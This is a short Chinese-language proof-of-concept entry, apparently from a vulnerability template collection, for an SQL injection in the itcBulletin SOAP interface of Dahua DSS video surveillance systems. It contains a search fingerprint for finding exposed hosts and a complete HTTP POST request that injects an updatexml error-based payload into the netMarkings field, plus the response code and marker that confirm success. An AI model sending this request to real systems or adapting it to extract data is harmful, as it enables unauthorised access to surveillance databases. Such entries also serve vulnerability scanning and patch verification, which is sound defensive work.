﻿# 大华 DSS itcBulletin SQL 注入漏洞

> 更新时间：2023-12-25

> 漏洞编号：

> 漏洞说明：大华DSS数字监控系统itcBulletin接口存在SQL注入漏洞，攻击者可以利用该漏洞获取数据库敏感信息。

> 漏洞特征：app="dahua-DSS"

> 验证脚本：HTTP

```

POST /portal/services/itcBulletin?wsdl HTTP/1.1
Connection: close
Accept-Encoding: gzip

<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
  <s11:Body>
    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
      <netMarkings>
        (updatexml(1,concat(0x7e,md5(102103122),0x7e),1))) and (1=1
      </netMarkings>
    </ns1:deleteBulletin>
  </s11:Body>
</s11:Envelope>
```

> 响应代码特征：500

> 响应内容特征：6cfe798ba8e5b85feb50164c59f4bec

> 上传文件定位：


> 验证文件来源：大华 DSS itcBulletin SQL 注入漏洞.poc
